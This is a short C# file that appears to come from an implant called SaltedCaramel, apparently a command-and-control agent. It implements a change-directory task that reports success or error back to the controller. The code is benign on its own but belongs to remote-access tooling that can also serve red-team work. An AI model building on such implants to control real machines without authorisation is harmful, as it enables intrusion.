using System;
using System.Diagnostics;
using System.IO;

namespace SaltedCaramel.Tasks
{
    class ChangeDir
    {
        internal static void Execute(SaltedCaramelTask task, SaltedCaramelImplant implant)
        {
            string path = task.@params;

            try
            {
                Directory.SetCurrentDirectory(path);
                implant.SendComplete(task.id);
            }
            catch (Exception e)
            {
                Debug.WriteLine($"[!] ChangeDir - ERROR: {e.Message}");
                implant.SendError(task.id, $"ChangeDir: {e.Message}");
            }
        }
    }
}
